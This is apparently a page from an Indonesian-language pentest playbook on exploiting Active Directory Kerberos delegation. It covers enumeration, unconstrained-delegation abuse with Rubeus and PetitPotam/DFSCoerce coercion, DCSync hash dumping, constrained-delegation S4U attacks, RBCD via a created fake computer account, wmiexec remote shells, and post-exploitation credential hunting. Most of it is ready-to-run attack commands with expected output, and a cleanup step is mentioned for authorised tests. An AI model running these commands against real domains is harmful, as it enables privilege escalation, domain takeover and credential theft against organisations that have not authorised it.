impacket-findDelegation "$DOMAIN/$USERNAME:$PASSWORD" -dc-ip $DC_IP

# Command 3: Cek via nxc (lebih cepat untuk overview)
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" \
    --trusted-for-delegation
```

**OUTPUT BERHASIL ✅ — Ada unconstrained:**

text

```
AccountName   AccountType  DelegationType   DelegationRightsTo
-----------   -----------  ---------------  ------------------
DC01$         Computer     Unconstrained    -
FILE01$       Computer     Unconstrained    -
svc-web       User         Constrained w/   HTTP/web01.corp.local
              Protocol
WEB01$        Computer     Constrained      CIFS/files01.corp.local
```

**Cara baca output — KRITIS, tentukan arah eksploitasi:**

|AccountName|DelegationType|Tindakan|
|---|---|---|
|`DC01$` Unconstrained|Domain Controller|Skip — normal, bukan target|
|`FILE01$` Unconstrained|Non-DC Computer|**→ TARGET UTAMA! Ke Fase 2**|
|`svc-web` Constrained w/ Protocol|User account|**→ Ke Fase 3 (S4U attack)**|
|`WEB01$` Constrained|Computer|**→ Ke Fase 3**|

**OUTPUT BERHASIL ✅ — Tidak ada delegation selain DC:**

text

```
AccountName   AccountType  DelegationType   DelegationRightsTo
-----------   -----------  ---------------  ------------------
DC01$         Computer     Unconstrained    -
```

➡️ Hanya DC yang unconstrained = normal. Lanjut cek RBCD di **Langkah 1.3**

**OUTPUT GAGAL ❌ — Script tidak ada:**

text

```
python3: can't open file '/opt/impacket/examples/findDelegation.py': No such file or directory
```

➡️ Cari path yang benar:

Bash

```
find / -name "findDelegation.py" 2>/dev/null
# Atau install impacket
pip3 install impacket
```

---

### Langkah 1.2 — BloodHound Queries untuk Delegation

Bash

```
# Jika BloodHound sudah punya data, jalankan queries ini di Neo4j browser
# atau gunakan bloodhound-python untuk collect dulu

# Collect BloodHound data
bloodhound-python \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    -ns $DC_IP \
    -d $DOMAIN \
    -c All \
    --zip \
    -o ~/delegation_loot/enum/bloodhound/
```

**Setelah data masuk BloodHound, jalankan Cypher queries:**

cypher

```
// Query 1: Cari semua computer dengan unconstrained delegation (EXCLUDE DC)
MATCH (c:Computer {unconstraineddelegation:true})
WHERE NOT c.name ENDS WITH 'DC'
AND NOT c.name STARTS WITH 'DC'
RETURN c.name, c.operatingsystem

// Query 2: Cari siapa yang punya GenericWrite ke computer (RBCD candidate)
MATCH p=(u)-[r:GenericWrite|WriteDacl|GenericAll]->(c:Computer)
WHERE NOT u.name ENDS WITH '$'
RETURN u.name, c.name, type(r)

// Query 3: Cari constrained delegation
MATCH (u)-[:AllowedToDelegate]->(target)
RETURN u.name, target.name
```

**OUTPUT BERHASIL ✅ — Query 1 ada hasil:**

text

```
FILE01.CORP.LOCAL    Windows Server 2019
APPSRV01.CORP.LOCAL  Windows Server 2022
```

➡️ Ada target unconstrained! Catat hostname: `FILE01.CORP.LOCAL` → Ke **Fase 2**

**OUTPUT BERHASIL ✅ — Query 2 ada hasil:**

text

```
lowprivuser@CORP.LOCAL   TARGET01$   GenericWrite
```

➡️ Kamu punya GenericWrite ke computer object! → Ke **Fase 4 (RBCD)**

---

### Langkah 1.3 — Cek MachineAccountQuota (Untuk RBCD)

Bash

```
# Command 1: Via PowerView/LDAP query
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" \
    "(objectClass=domain)" \
    ms-DS-MachineAccountQuota \
    2>/dev/null | grep -i "MachineAccountQuota"

# Command 2: Via nxc
nxc ldap $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" \
    -M maq
```

**OUTPUT BERHASIL ✅ — MAQ > 0:**

text

```
ms-DS-MachineAccountQuota: 10
```

➡️ Bisa buat fake computer account! Simpan info ini untuk Fase 4.

**OUTPUT BERHASIL ✅ — MAQ = 0:**

text

```
ms-DS-MachineAccountQuota: 0
```

➡️ Tidak bisa buat computer baru. Untuk RBCD, perlu cari existing controlled computer account. Cek apakah kamu sudah compromise machine account lain.

Bash

```
# Cari computer account yang mungkin sudah dikompromis
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" --computers | tee ~/delegation_loot/enum/computers.txt
```

---

## ═══════════════════════════════════════

## FASE 2: UNCONSTRAINED DELEGATION EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini jika:** findDelegation/BloodHound menunjukkan ada computer NON-DC dengan `Unconstrained` delegation yang bisa diakses.

### Langkah 2.1 — Konfirmasi Akses ke Unconstrained Computer

Bash

```
# Set variabel target unconstrained
export UNCON_HOST="FILE01"
export UNCON_IP="10.10.10.20"
export UNCON_FQDN="FILE01.CORP.LOCAL"

# Tambahkan ke /etc/hosts
echo "$UNCON_IP $UNCON_FQDN $UNCON_HOST" | sudo tee -a /etc/hosts

# Cek akses
nxc smb $UNCON_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN"
```

**OUTPUT BERHASIL ✅ — Dapat akses (bahkan tanpa Pwn3d!):**

text

```
SMB   10.10.10.20  445  FILE01  [+] corp.local\lowprivuser:Password123!
```

➡️ Kita bisa masuk ke machine ini. Tapi untuk exploit unconstrained, kita butuh **akses ke memory** (butuh local admin atau sudah compromise machine ini sebelumnya).

**SKENARIO A — Sudah punya shell di FILE01:**

PowerShell

```
# Di shell Windows FILE01 (setelah initial access)
# Monitor TGT yang masuk setiap 5 detik
.\Rubeus.exe monitor /interval:5 /nowrap /filteruser:administrator
```

**OUTPUT BERHASIL ✅ — TGT muncul:**

text

```
[*] Monitoring for new TGTs every 5 seconds...

[*] 09/01/2025 13:25:10
UserName              : administrator
ServiceName           : krbtgt/CORP.LOCAL
Base64(ticket.kirbi)  : doIF6DCCBeSgAwIBBaEDAgEWooIE...
```

➡️ **SIMPAN TICKET INI:**

PowerShell

```
# Simpan base64 ticket
$ticket = "doIF6DCCBeSgAwIBBaEDAgEWooIE..."
[System.IO.File]::WriteAllBytes("C:\Users\Public\admin_tgt.kirbi", [System.Convert]::FromBase64String($ticket))
```

**OUTPUT GAGAL ❌ — Tidak ada TGT masuk setelah menunggu:**

text

```
[*] Monitoring for new TGTs every 5 seconds...
[*] (no new TGTs seen after 60 seconds)
```

➡️ Perlu **trigger authentication** dari privileged user/DC. Lanjut ke **Langkah 2.2 (Coercion)**

---

### Langkah 2.2 — Coercion Attack (Paksa DC Authenticate ke FILE01)

> **Tujuan:** Paksa DC01 untuk melakukan authentication ke FILE01 kita, sehingga TGT DC masuk ke memory FILE01.

Bash

```
# Di Parrot OS — Terminal 1: Setup listener/monitor
# (Di FILE01 Windows, Rubeus sudah berjalan dari Langkah 2.1)

# Terminal 2: Cek apakah Spooler service aktif di DC
python3 /opt/impacket/examples/rpcdump.py \
    "$DOMAIN/$USERNAME:$PASSWORD@$DC_IP" \
    | grep -i "spool\|MS-RPRN" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Spooler aktif:**

text

```
Protocol: [MS-RPRN]: Print System Remote Protocol
Provider: spoolsv.exe
UUID    : 12345678-1234-ABCD-EF00-0123456789AB
```

Bash

```
# Trigger PrinterBug / PetitPotam
# Method 1: PetitPotam (jika tersedia)
python3 /opt/PetitPotam/PetitPotam.py \
    -d "$DOMAIN" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    "$UNCON_FQDN" \
    "$DC_IP"

# Method 2: DFSCoerce
python3 /opt/DFSCoerce/dfscoerce.py \
    -d "$DOMAIN" \
    -u "$USERNAME" \
    -p "$PASSWORD" \
    "$UNCON_FQDN" \
    "$DC_IP"
```

**OUTPUT BERHASIL ✅ — Coercion berhasil:**

text

```
[*] Trying pipe lsarpc
[+] Connected to $DC_IP
[+] Trigger succeeded!
```

➡️ Lihat terminal Rubeus di FILE01, TGT DC01$ atau Administrator harus muncul!

**OUTPUT GAGAL ❌ — Coercion tidak berhasil:**

text

```
[-] Connecting to ncacn_ip_tcp:10.10.10.10[135]
[-] Something went wrong: SMB SessionError: ...
```

**Troubleshooting berurutan:**

Bash

```
# Coba sintaks berbeda
python3 /opt/PetitPotam/PetitPotam.py "$UNCON_IP" "$DC_IP"

# Cek apakah ada mitigasi EPA/signing
nxc smb $DC_IP -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" \
    -M petitpotam

# Google: "PetitPotam bypass [tahun] Windows Server [versi]"
# Search: site:github.com PetitPotam patch bypass
```

---

### Langkah 2.3 — Export & Use TGT (Pass-the-Ticket)

**Di FILE01 (Windows):**

PowerShell

```
# Dump semua ticket setelah coercion
.\Rubeus.exe dump /nowrap /service:krbtgt

# Inject TGT DC01$ ke logon session
.\Rubeus.exe ptt /ticket:BASE64_TICKET_DARI_DUMP

# Verifikasi
klist
```

**OUTPUT BERHASIL ✅:**

text

```
Cached Tickets: (1)
#0>     Client: DC01$ @ CORP.LOCAL
        Server: krbtgt/CORP.LOCAL @ CORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Start Time: 1/9/2025 13:25:10
        End Time:   1/9/2025 23:25:10
```

**Transfer ticket ke Parrot OS untuk dipakai impacket:**

Bash

```
# Di FILE01: simpan sebagai file
.\Rubeus.exe dump /nowrap /service:krbtgt /outfile:dc01_tgt.kirbi

# Transfer ke Parrot (via SMB, curl, atau shell yang ada)
# Kemudian di Parrot:
impacket-ticketConverter dc01_tgt.kirbi dc01_tgt.ccache
export KRB5CCNAME="$PWD/dc01_tgt.ccache"
klist
```

**OUTPUT BERHASIL ✅ — klist di Linux:**

text

```
Credentials cache: FILE:dc01_tgt.ccache
        Principal: DC01$@CORP.LOCAL

Valid starting     Expires            Service principal
01/09/25 13:25:10  01/09/25 23:25:10  krbtgt/CORP.LOCAL@CORP.LOCAL
```

---

### Langkah 2.4 — DCSync (Jika TGT adalah DC Machine Account)

Bash

```
# Gunakan ticket DC01$ untuk DCSync
impacket-secretsdump \
    -k \
    -no-pass \
    -dc-ip "$DC_IP" \
    "$DOMAIN/DC01\$@dc01.$DOMAIN"
```

**OUTPUT BERHASIL ✅ — DCSync berhasil:**

text

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9d765b482771505cbe97411065f6a9ed:::
diana:1104:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

➡️ **SIMPAN SEMUA HASH:**

Bash

```
# Simpan ke file
impacket-secretsdump \
    -k -no-pass -dc-ip "$DC_IP" \
    "$DOMAIN/DC01\$@dc01.$DOMAIN" \
    | tee ~/delegation_loot/creds/dcsync_hashes.txt

# Crack Administrator hash
export ADMIN_HASH="aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881"
echo "Administrator:$ADMIN_HASH" >> ~/delegation_loot/creds/found_creds.txt

# Test PTH
nxc smb $DC_IP -u "Administrator" -H "$ADMIN_HASH" --shares
# Jika (Pwn3d!) → Domain Compromise! → Ke <a href="/docs/domain-persistence" class="text-[#00b4d8] hover:underline font-mono font-semibold">43_domain_persistence_workflow.md</a>
```

**OUTPUT GAGAL ❌ — Access Denied saat DCSync:**

text

```
[-] DRSUAPI SessionError: code: 0x20f7 - ERROR_DS_DRA_ACCESS_DENIED
```

➡️ Machine account DC01$ biasanya punya replication rights, tapi mungkin ada proteksi. Coba aksi lain:

Bash

```
# Akses C$ langsung
impacket-smbclient -k -no-pass "$DOMAIN/DC01\$@dc01.$DOMAIN"

# List share
# smb: \> ls
# → Cari NTDS.dit, SAM, SYSTEM untuk offline extraction
```

---

## ═══════════════════════════════════════

## FASE 3: CONSTRAINED DELEGATION EXPLOITATION

## ═══════════════════════════════════════

> **Masuk sini jika:** findDelegation menunjukkan account dengan `Constrained` atau `Constrained w/ Protocol` delegation.

### Langkah 3.1 — Analisis Detail Constrained Delegation

Bash

```
# Set variabel dari hasil findDelegation
export DELEG_ACCOUNT="svc-web"      # Account yang punya delegation
export DELEG_PASS="ServicePass123!" # Password account tersebut
export TARGET_SPN="CIFS/fileserver.corp.local"  # SPN yang bisa didelegasikan
export TARGET_HOST="fileserver.corp.local"
export IMPERSONATE="administrator"

# Verifikasi detail delegation
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$DELEG_ACCOUNT:$DELEG_PASS" \
    -dc-ip "$DC_IP" \
    | grep -A5 "$DELEG_ACCOUNT"
```

**OUTPUT BERHASIL ✅ — Constrained WITH Protocol Transition:**

text

```
AccountName  DelegationType              DelegationRightsTo
-----------  --------------------------  -------------------
svc-web      Constrained w/ Protocol     CIFS/fileserver.corp.local
                                         HTTP/fileserver.corp.local
```

➡️ **Protocol Transition = BISA S4U2Self!** Tidak perlu password user target. Lanjut ke **Langkah 3.2**

**OUTPUT BERHASIL ✅ — Constrained WITHOUT Protocol Transition:**

text

```
AccountName  DelegationType  DelegationRightsTo
-----------  --------------  -------------------
svc-web      Constrained     CIFS/fileserver.corp.local
```

➡️ Butuh Kerberos auth dari user target dulu. Lebih terbatas. Lanjut ke **Langkah 3.4**

---

### Langkah 3.2 — S4U Attack dengan Password (Protocol Transition)

Bash

```
# Step 1: Dapatkan TGT untuk account delegation
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$DELEG_ACCOUNT:$DELEG_PASS" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Saving ticket in svc-web.ccache
```

Bash

```
# Step 2: Set cache
export KRB5CCNAME="$PWD/svc-web.ccache"

# Verifikasi TGT
klist
```

**OUTPUT BERHASIL ✅:**

text

```
Credentials cache: FILE:svc-web.ccache
        Principal: svc-web@CORP.LOCAL
Valid starting     Expires
01/09/25 13:00:00  01/09/25 23:00:00  krbtgt/CORP.LOCAL
```

Bash

```
# Step 3: Request service ticket via S4U2Self + S4U2Proxy
python3 /opt/impacket/examples/getST.py \
    "$DOMAIN/$DELEG_ACCOUNT" \
    -k \
    -no-pass \
    -spn "$TARGET_SPN" \
    -impersonate "$IMPERSONATE" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

➡️ Ticket berhasil! Lanjut ke **Langkah 3.5 — Gunakan Ticket**

**OUTPUT GAGAL ❌ — KDC_ERR_BADOPTION:**

text

```
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
```

➡️ SPN mungkin salah atau delegation config tidak match. Cek:

Bash

```
# Lihat SPN yang benar
python3 /opt/impacket/examples/findDelegation.py \
    "$DOMAIN/$DELEG_ACCOUNT:$DELEG_PASS" \
    -dc-ip "$DC_IP"

# Coba SPN alternatif (HOST biasanya ter-include)
export TARGET_SPN="HOST/$TARGET_HOST"
# Ulangi getST.py dengan SPN baru
```

**OUTPUT GAGAL ❌ — Clock skew:**

text

```
[-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
```

➡️ **WAJIB sync waktu dulu:**

Bash

```
sudo ntpdate -u $DC_IP
# Ulangi dari getTGT.py
```

---

### Langkah 3.3 — S4U Attack dengan NTLM Hash

Bash

```
# Jika punya hash bukan password
export DELEG_HASH="aad3b435b51404eeaad3b435b51404ee:NTHASHHERE"

# Request TGT dengan hash
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/$DELEG_ACCOUNT" \
    -hashes "$DELEG_HASH" \
    -dc-ip "$DC_IP"

# Lanjut sama seperti Langkah 3.2 dari Step 2
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Saving ticket in svc-web.ccache
```

---

### Langkah 3.4 — Constrained Delegation via Rubeus (Windows)

PowerShell

```
# Jika sudah punya shell Windows di machine yang sama domain

# Method 1: Dengan password
.\Rubeus.exe s4u `
    /user:svc-web `
    /password:ServicePass123! `
    /impersonateuser:administrator `
    /msdsspn:"CIFS/fileserver.corp.local" `
    /ptt

# Method 2: Dengan NTLM hash
.\Rubeus.exe s4u `
    /user:svc-web `
    /rc4:NTHASH_HERE `
    /impersonateuser:administrator `
    /msdsspn:"CIFS/fileserver.corp.local" `
    /ptt

# Verifikasi
klist
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Action: S4U
[*] Using domain controller: DC01.corp.local
[*] Building S4U2self request for: 'svc-web@CORP.LOCAL'
[*] Sending S4U2self request...
[+] S4U2self success!
[*] Building S4U2proxy request for service: 'CIFS/fileserver.corp.local'
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'CIFS/fileserver.corp.local':
      doIF...
[+] Ticket successfully imported!

Cached Tickets: (1)
#0>     Client: administrator @ CORP.LOCAL
        Server: CIFS/fileserver.corp.local @ CORP.LOCAL
```

---

### Langkah 3.5 — Gunakan Ticket untuk Akses Target

Bash

```
# Di Parrot OS — setelah dapat administrator.ccache
export KRB5CCNAME="$PWD/administrator.ccache"

# Verifikasi dulu
klist

# Method 1: Akses SMB/CIFS
python3 /opt/impacket/examples/smbclient.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$TARGET_HOST"
```

**OUTPUT BERHASIL ✅ — SMB berhasil:**

text

```
[*] Connecting to fileserver.corp.local
Impacket SMB Client 0.12.0

Type help for list of commands
# shares
ADMIN$
C$
Users
```

Bash

```
# Method 2: Remote execution
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$TARGET_HOST"
```

**OUTPUT BERHASIL ✅ — Shell didapat:**

text

```
[*] SMB target: fileserver.corp.local
[*] Using Kerberos authentication
Impacket v0.12.0

[*] AUTHENTICATED AS: administrator

C:\>whoami
corp\administrator
```

**OUTPUT GAGAL ❌ — Kerberos auth error:**

text

```
[-] SMB SessionError: STATUS_MORE_PROCESSING_REQUIRED
```

➡️ Target tidak bisa di-resolve via Kerberos. Pastikan hostname ada di `/etc/hosts`:

Bash

```
nslookup $TARGET_HOST $DC_IP  # Resolve via DC
echo "$(nslookup $TARGET_HOST $DC_IP | grep Address | tail -1 | awk '{print $2}') $TARGET_HOST" | sudo tee -a /etc/hosts
```

---

## ═══════════════════════════════════════

## FASE 4: RBCD — RESOURCE-BASED CONSTRAINED DELEGATION

## ═══════════════════════════════════════

> **Masuk sini jika:** BloodHound menunjukkan kamu punya GenericWrite/WriteDACL/GenericAll ke computer object target.

### Langkah 4.1 — Konfirmasi Write Permission ke Target Computer

Bash

```
# Set variabel
export RBCD_TARGET="TARGET01$"    # Computer yang mau diakses
export RBCD_TARGET_IP="10.10.10.30"
export RBCD_TARGET_FQDN="target01.corp.local"

# Verifikasi permission (via PowerView jika punya Windows shell)
# Atau trust hasil BloodHound
```

**Di Windows (jika punya shell):**

PowerShell

```
# Import PowerView
Import-Module .\PowerView.ps1

# Cek ACL langsung
Get-DomainObjectAcl -Identity "$RBCD_TARGET" -ResolveGUIDs | 
    Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|WriteDACL|GenericAll" }
```

**OUTPUT BERHASIL ✅:**

text

```
ObjectDN              : CN=TARGET01,CN=Computers,DC=corp,DC=local
ActiveDirectoryRights : GenericWrite
IdentityReference     : CORP\lowprivuser
```

➡️ Confirmed! Punya GenericWrite. Lanjut ke **Langkah 4.2**

---

### Langkah 4.2 — Cek MAQ dan Buat/Tentukan Fake Computer

Bash

```
# Cek MachineAccountQuota (sudah dilakukan di Langkah 1.3)
# Jika MAQ > 0, buat fake computer

export FAKE_COMP="EVILPC2025$"
export FAKE_PASS="Evil@123456!"

# Buat machine account
python3 /opt/impacket/examples/addcomputer.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -method LDAPS \
    -computer-name "$FAKE_COMP" \
    -computer-pass "$FAKE_PASS" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Successfully added machine account EVILPC2025$ with password Evil@123456!
```

**OUTPUT GAGAL ❌ — Constraint violation / MAQ = 0:**

text

```
[-] LDAP(S) error: {'desc': 'Constraint violation', 'info': "...00002D29..."}
```

➡️ MAQ = 0 atau sudah exceed quota. Cari existing controlled computer:

Bash

```
# Lihat apakah ada machine yang sudah dikompromis
cat ~/delegation_loot/enum/computers.txt
# Pilih salah satu yang sudah kamu kontrol
export FAKE_COMP="EXISTINGMACHINE$"
export FAKE_PASS="PasswordMachineYangSudahDiketahui"
```

**OUTPUT GAGAL ❌ — LDAPS tidak available:**

text

```
[-] Error connecting to LDAPS
```

Bash

```
# Coba method SAMR
python3 /opt/impacket/examples/addcomputer.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -method SAMR \
    -computer-name "$FAKE_COMP" \
    -computer-pass "$FAKE_PASS" \
    -dc-ip "$DC_IP"
```

---

### Langkah 4.3 — Verifikasi Computer Account Berhasil Dibuat

Bash

```
# Verifikasi via LDAP
ldapsearch -x \
    -H "ldap://$DC_IP" \
    -D "$USERNAME@$DOMAIN" \
    -w "$PASSWORD" \
    -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" \
    "(sAMAccountName=${FAKE_COMP})" \
    sAMAccountName \
    2>/dev/null | grep -i "sAMAccountName"
```

**OUTPUT BERHASIL ✅:**

text

```
sAMAccountName: EVILPC2025$
```

**OUTPUT GAGAL ❌ — Tidak ketemu:**

text

```
# (no results)
```

➡️ Replication delay. Tunggu 30 detik dan coba lagi:

Bash

```
sleep 30
ldapsearch -x -H "ldap://$DC_IP" -D "$USERNAME@$DOMAIN" -w "$PASSWORD" \
    -b "DC=$(echo $DOMAIN | sed 's/\./,DC=/g')" \
    "(sAMAccountName=${FAKE_COMP})" sAMAccountName 2>/dev/null
```

---

### Langkah 4.4 — Set RBCD Attribute ke Target Computer

Bash

```
# Tulis msDS-AllowedToActOnBehalfOfOtherIdentity
# Target: RBCD_TARGET mempercayai FAKE_COMP

python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action write \
    -delegate-to "$RBCD_TARGET" \
    -delegate-from "$FAKE_COMP" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] EVILPC2025$ can now impersonate users on TARGET01$ via S4U2Proxy
```

**OUTPUT GAGAL ❌ — Permission denied:**

text

```
[-] Error modifying object: LDAP object not found or user does not have sufficient privileges
```

➡️ Kamu tidak punya write access. Verifikasi ulang di BloodHound:

cypher

```
MATCH p=(u {name:"LOWPRIVUSER@CORP.LOCAL"})-[r]->(c {name:"TARGET01$"})
RETURN p
```

➡️ Jika tidak ada edge, berarti asumsi write access salah. Cari target lain.

---

### Langkah 4.5 — Verifikasi RBCD Berhasil

Bash

```
# Baca kembali attribute untuk konfirmasi
python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action read \
    -delegate-to "$RBCD_TARGET" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Principals allowed to act on behalf of users:
[*]     EVILPC2025$
```

➡️ Confirmed! Lanjut ke **Langkah 4.6**

**OUTPUT GAGAL ❌ — Kosong:**

text

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
```

➡️ Write tidak berhasil tersimpan. Coba dengan domain admin creds jika tersedia, atau cek permission lagi.

---

### Langkah 4.6 — Request TGT untuk Fake Computer

Bash

```
# Request TGT untuk fake computer
python3 /opt/impacket/examples/getTGT.py \
    "$DOMAIN/${FAKE_COMP}:${FAKE_PASS}" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Saving ticket in EVILPC2025$.ccache
```

Bash

```
# Set cache ke TGT fake computer
export KRB5CCNAME="$PWD/EVILPC2025\$.ccache"
klist
```

---

### Langkah 4.7 — S4U2Self + S4U2Proxy via Fake Computer

Bash

```
# Set target SPN
export RBCD_SPN="CIFS/$RBCD_TARGET_FQDN"

# Request impersonation ticket
python3 /opt/impacket/examples/getST.py \
    "$DOMAIN/$FAKE_COMP" \
    -k \
    -no-pass \
    -spn "$RBCD_SPN" \
    -impersonate "$IMPERSONATE" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

**OUTPUT GAGAL ❌ — S4U2Proxy gagal:**

text

```
[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)
```

➡️ RBCD belum ter-replicate atau SPN salah:

Bash

```
# Coba SPN HOST
export RBCD_SPN="HOST/$RBCD_TARGET_FQDN"
# Tunggu 60 detik untuk replikasi
sleep 60
# Ulangi getST.py
```

---

### Langkah 4.8 — Akses Target via Ticket RBCD

Bash

```
# Gunakan ticket administrator
export KRB5CCNAME="$PWD/administrator.ccache"

# Verifikasi ticket
klist

# Akses target
python3 /opt/impacket/examples/wmiexec.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$RBCD_TARGET_FQDN"
```

**OUTPUT BERHASIL ✅ — Shell didapat:**

text

```
C:\>whoami
corp\administrator

C:\>hostname  
TARGET01
```

➡️ **MACHINE COMPROMISED!**

Bash

```
# Dump credentials untuk lateral movement
python3 /opt/impacket/examples/secretsdump.py \
    -k \
    -no-pass \
    "$DOMAIN/administrator@$RBCD_TARGET_FQDN" \
    | tee ~/delegation_loot/creds/target01_hashes.txt
```

---

### Langkah 4.9 — Cleanup RBCD (PENTING untuk Real Pentest)

Bash

```
# WAJIB di real pentest — kembalikan ke kondisi awal
python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action flush \
    -delegate-to "$RBCD_TARGET" \
    -dc-ip "$DC_IP"
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity cleared successfully
```

Bash

```
# Verifikasi sudah bersih
python3 /opt/impacket/examples/rbcd.py \
    "$DOMAIN/$USERNAME:$PASSWORD" \
    -action read \
    -delegate-to "$RBCD_TARGET" \
    -dc-ip "$DC_IP"
# Harus menunjukkan: "Attribute ... is empty"

# Dokumentasi untuk laporan
echo "RBCD cleanup completed on $(date)" >> ~/delegation_loot/cleanup_log.txt
echo "Modified: $RBCD_TARGET msDS-AllowedToActOnBehalfOfOtherIdentity" >> ~/delegation_loot/cleanup_log.txt
```

---

## ═══════════════════════════════════════

## FASE 5: POST-EXPLOITATION & PIVOT

## ═══════════════════════════════════════

### Langkah 5.1 — Setelah Dapat Shell — Collect Info untuk Lateral Movement

**Di Windows shell:**

PowerShell

```
# Info sistem
whoami /all
whoami /priv
ipconfig /all
net localgroup administrators

# User lain yang login
query user
net session

# Network untuk pivot target berikutnya
arp -a
net view /domain
route print

# Cari credentials tersimpan
cmdkey /list
dir C:\Users\*\AppData\Roaming\Microsoft\Credentials\* 2>nul
dir C:\Users\*\AppData\Local\Microsoft\Credentials\* 2>nul

# Cari file sensitif
dir C:\Users\*\Desktop\*.txt /s 2>nul
dir C:\Users\*\Documents\*.txt /s 2>nul
findstr /si password C:\Users\*.txt C:\Users\*.ini C:\Users\*.config 2>nul
```

**Di Linux shell (jika target Linux):**

Bash

```
whoami; id; hostname; ip addr
cat /etc/passwd
sudo -l
find / -perm /4000 -type f 2>/dev/null   # SUID files
cat ~/.bash_history
find / -name "*.conf" -readable 2>/dev/null | xargs grep -i password 2>/dev/null
```

---

### Langkah 5.2 — Dump Hashes dari Machine yang Dikompromis

Bash

```
# Via secretsdump dengan credentials
python3 /opt/impacket/examples/secretsdump.py \
    "$DOMAIN/$IMPERSONATE@$RBCD_TARGET_FQDN" \
    -k \
    -no-pass \
    -outputfile ~/delegation_loot/creds/all_hashes

# Lihat hasil
cat ~/delegation_loot/creds/all_hashes.sam
cat ~/delegation_loot/creds/all_hashes.secrets
```

**OUTPUT BERHASIL ✅:**

text

```
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971881:::
svc-backup:1001:aad3b435b51404eeaad3b435b51404ee:7c6a180b36896a0a8c02787eeafb0e4c:::
[*] Dumping cached domain logon information
corp.local/diana:$DCC2$10240#diana#5c7132be...
```

---

### Cross-Service Testing Chart

Setiap kali dapat Kerberos ticket atau credentials dari Delegation attack:

text

```
Delegation Success
      │
      ├──→ Domain Controller      → impacket-secretsdump (DCSync)
      ├──→ File Server (CIFS)     → impacket-smbclient
      ├──→ Web Server (HTTP)      → curl -k --negotiate -u: http://target/
      ├──→ MSSQL (MSSQLSvc)      → impacket-mssqlclient -k → <a href="/docs/mssql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14b_mssql_workflow.md</a>
      ├──→ WinRM (5985/5986)     → evil-winrm (tidak support Kerberos langsung,
      │                            perlu PTH atau password)
      └──→ Lateral Movement      → <a href="/docs/lateral-movement" class="text-[#00b4d8] hover:underline font-mono font-semibold">42_lateral_movement_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|`KRB_AP_ERR_SKEW`|Clock beda >5 menit|`sudo ntpdate -u $DC_IP` DULU sebelum apapun|
|`KDC_ERR_BADOPTION`|SPN salah atau delegation config mismatch|Cek `findDelegation.py`, coba SPN HOST/CIFS/HTTP alternatif|
